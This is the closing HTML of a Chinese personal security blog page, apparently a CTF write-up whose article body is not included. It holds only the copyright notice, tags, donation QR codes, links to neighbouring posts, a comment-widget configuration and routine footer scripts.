</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">J0k3r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://j0k3r.top/2018/11/06/kelai_wp/">http://j0k3r.top/2018/11/06/kelai_wp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://j0k3r.top">J0k3r's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WriteUp/">WriteUp</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post-qr-code"><div class="post-qr-code-item"><img class="post-qr-code__img" src="../../../../img/alipay.jpg"><div class="post-qr-code__desc">支付宝打赏</div></div><div class="post-qr-code-item"><img class="post-qr-code__img" src="../../../../img/wechat.jpg"><div class="post-qr-code__desc">微信打赏</div></div></div><div class="social-share"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="prev-post pull-left"><a href="/2018/11/14/hctf2018/"><i class="fa fa-chevron-left">  </i><span>HCTF 2018 WriteUp</span></a></div><div class="next-post pull-right"><a href="/2018/10/23/php-unserialize/"><span>PHP反序列化漏洞</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
var verify = 'true' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'yeOeLCiDRMa7CAnJy2jxA2IY-gzGzoHsz',
  appKey:'eAgtubAYTMshS76hpc1F1UBG',
  placeholder:'Just go go',
  avatar:'mm',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer class="footer-bg" style="background-image: url(https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/wallhaven-j5k275.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2020 By J0k3r</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"superSample":2,"width":210,"height":420,"position":"left","hOffset":0,"vOffset":-20},"log":false,"tagMode":false});</script></body></html>